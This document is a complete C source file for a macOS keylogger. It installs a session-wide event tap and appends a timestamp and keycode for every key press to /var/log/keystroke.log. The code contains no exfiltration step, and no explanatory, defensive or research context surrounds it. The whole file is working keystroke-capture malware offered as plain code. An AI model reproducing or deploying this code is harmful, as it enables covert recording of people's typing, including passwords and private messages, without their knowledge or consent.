#include <stdio.h>
#include <time.h>
#include <ApplicationServices/ApplicationServices.h>

// Function to log keystrokes
CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    if (type == kCGEventKeyDown) {
        char path[1024];
        sprintf(path, "/var/log/keystroke.log");
        FILE *f = fopen(path, "a");
        if (f) {
            CGKeyCode keycode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
            fprintf(f, "%lld %d\n", (long long)time(NULL), keycode);
            fclose(f);
        }
    }
    return event;
}

int main() {
    // Create an event tap to listen for key presses
    CFMachPortRef eventTap = CGEventTapCreate(
        kCGSessionEventTap, kCGHeadInsertEventTap, 0, kCGEventMaskForAllEvents, CGEventCallback, NULL);

    if (!eventTap) {
        fprintf(stderr, "Failed to create event tap.\n");
        return 1;
    }

    // Add the event tap to the run loop
    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);
    CFRunLoopRun();

    return 0;
}